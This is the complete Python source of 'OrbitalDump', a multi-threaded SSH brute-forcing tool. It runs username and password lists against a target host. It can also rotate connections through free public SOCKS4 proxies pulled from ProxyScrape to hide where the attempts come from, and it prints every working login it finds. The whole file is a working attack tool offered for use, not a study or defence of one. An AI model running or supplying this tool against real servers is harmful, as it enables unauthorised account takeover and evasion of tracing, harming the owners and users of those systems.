#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Name: OrbitalDump
Author: K4YT3X
Date Created: June 6, 2021
Last Modified: July 5, 2021

A simple multi-threaded distributed SSH brute-forcing tool written in Python.
"""

# built-in imports
import argparse
import collections
import logging
import pathlib
import queue
import socket
import sys
import threading
import time

# third-party imports
from loguru import logger
import paramiko
import requests
import socks


class SshBruteForcer(threading.Thread):
    def __init__(
        self,
        jobs: queue.Queue,
        valid_credentials: list,
        proxies: collections.deque = None,
    ):
        """
        SSH brute forcer initialization function

        :param jobs queue.Queue: a queue object containing scanning jobs
        :param valid_credentials list: a list to contain valid credentials
        :param proxies collections.deque: a deque of proxies to use
        """
        threading.Thread.__init__(self)
        self.jobs = jobs
        self.valid_credentials = valid_credentials
        self.proxies = proxies

    def run(self):
        self.running = True
        while self.running:
            try:
                hostname, username, password, port, timeout = self.jobs.get(False)
            except queue.Empty:
                time.sleep(0.1)
                continue

            try:
                sock = None
                if self.proxies is not None:
                    self.proxy = self.proxies.popleft()
                    sock = socks.socksocket()
                    sock.set_proxy(
                        proxy_type=socks.SOCKS4,
                        addr=self.proxy.split(":")[0],
                        port=int(self.proxy.split(":")[1]),
                    )
                    sock.settimeout(timeout)
                    sock.connect((hostname, port))

                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                logger.debug(
                    f"Testing {username}@{hostname}:{port}:{password}"
                    + (f" with proxy {self.proxy}" if self.proxies else "")
                )

                client.connect(
                    hostname=hostname,
                    username=username,
                    password=password,
                    port=port,
                    timeout=timeout,
                    sock=sock,
                )

            # connection timeout
            except (
                socket.timeout,
                socks.GeneralProxyError,
                socks.ProxyConnectionError,
                paramiko.SSHException,
            ):
                logger.debug(
                    f"(queue size: {self.jobs.qsize()}) Connection error: {username}@{hostname}:{port}:{password}"
                )
                self.jobs.put((hostname, username, password, port, timeout))

            # authentication failure (wrong password)
            except paramiko.AuthenticationException:
                logger.info(
                    f"(queue size: {self.jobs.qsize()}) Invalid credential: {username}@{hostname}:{port}:{password}"
                )

            # other uncaught exceptions
            except Exception as e:
                logger.error(
                    f"(queue size: {self.jobs.qsize()}) Uncaught exception {e}:  {username}@{hostname}:{port}:{password}"
                )

            # login successful
            else:
                logger.success(
                    f"(queue size: {self.jobs.qsize()}) Valid credential found: {username}@{hostname}:{port}:{password}"
                )
                self.valid_credentials.append(
                    (hostname, username, password, port, timeout)
                )

            if self.proxies is not None:
                self.proxies.append(self.proxy)

            self.jobs.task_done()

        return super().run()

    def stop(self):
        self.running = False
        self.join()


def parse_arguments() -> argparse.Namespace:
    """
    parse command line arguments

    :rtype argparse.Namespace: namespace storing the parsed arguments
    """

    parser = argparse.ArgumentParser(
        prog="orbitaldump",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        add_help=False,
    )
    parser.add_argument("--help", action="help", help="show this help message and exit")

    parser.add_argument(
        "-t", "--threads", help="number of threads to use", default=5, type=int
    )

    parser.add_argument(
        "-u", "--username", type=pathlib.Path, help="username file path"
    )

    parser.add_argument(
        "-p", "--password", type=pathlib.Path, help="password file path"
    )

    parser.add_argument("-h", "--hostname", help="target hostname", required=True)
    parser.add_argument("--port", type=int, help="target port", default=22)
    parser.add_argument("--timeout", type=int, help="SSH timeout", default=6)
    parser.add_argument(
        "--proxies", help="use SOCKS proxies from ProxyScrape", action="store_true"
    )

    return parser.parse_args()


def get_proxies() -> collections.deque:
    """
    retrieve a list(deque) of usable SOCKS4 proxies from ProxyScrape
    the format looks something like deque(["1.1.1.1:1080", "2.2.2.2:1080"])

    :rtype collections.deque: a deque of proxies
    """
    logger.info("Retrieving SOCKS4 proxies from ProxyScrape")
    proxies_request = requests.get(
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all"
    )

    # if response status code is 200, return the list of retrieved proxies
    if proxies_request.status_code == requests.codes.ok:
        proxies = proxies_request.text.split()
        logger.info(f"Successfully retrieved {len(proxies)} proxies")
        return collections.deque(proxies)

    # requests failed to download the list of proxies, raise an exception
    else:
        logger.critical("An error occured while retrieving a list of proxies")
        proxies_request.raise_for_status()


def main():
    # disable built-in logging so paramiko won't print tracebacks
    logging.basicConfig(level=logging.CRITICAL)

    # remove built-in logger sink
    logger.remove(0)

    # add custom logger sink
    logger.add(
        sys.stderr,
        colorize=True,
        format="<fg 240>{time:HH:mm:ss.SSSSSS!UTC}</fg 240> | <level>{level: <8}</level> | <level>{message}</level>",
    )

    try:
        # parse command line arguments
        args = parse_arguments()

        # verify argument validity
        try:
            assert args.threads >= 1, "number of threads must >= 1"
            assert args.username.is_file(), "username file does not exist"
            assert args.password.is_file(), "password file does not exist"
            assert args.port >= 0, "the port number must >= 0"
            assert args.timeout >= 0, "timeout must >= 0"
        except AssertionError as e:
            logger.error(e)
            sys.exit(1)

        # initialize variables
        thread_pool = []
        jobs = queue.Queue()
        valid_credentials = []

        # get proxies from ProxyScrape
        proxies = None
        if args.proxies:
            proxies = get_proxies()

        # create threads
        logger.info(f"Launching {args.threads} brute-forcer threads")
        for thread_id in range(args.threads):
            thread = SshBruteForcer(jobs, valid_credentials, proxies)
            thread.name = str(thread_id)
            thread.start()
            thread_pool.append(thread)

        # add username and password combinations to jobs queue
        logger.info("Loading usernames and passwords into queue")
        with args.username.open("r") as username_file:
            with args.password.open("r") as password_file:
                for username in username_file:
                    for password in password_file:
                        jobs.put(
                            (
                                args.hostname,
                                username.strip(),
                                password.strip(),
                                args.port,
                                args.timeout,
                            )
                        )

        try:
            while not jobs.empty():
                for thread in thread_pool:
                    if not thread.is_alive():
                        logger.error(
                            f"Thread {thread.name} exited early with errors",
                            file=sys.stderr,
                        )

                for thread in thread_pool:
                    if thread.is_alive():
                        break
                else:
                    break

        except (SystemExit, KeyboardInterrupt):
            logger.warning("Stop signal received, stopping threads")

        finally:
            for thread in thread_pool:
                thread.stop()

            for thread in thread_pool:
                thread.join()

        logger.success(
            f"Brute-force completed, {len(valid_credentials)} valid credentials found"
        )
        for hostname, username, password, port, timeout in valid_credentials:
            print(f"{username}@{hostname}:{port}:{password}")

    except Exception as e:
        logger.exception(e)
        sys.exit(1)


# launch the main function if this file is ran directly
if __name__ == "__main__":
    main()
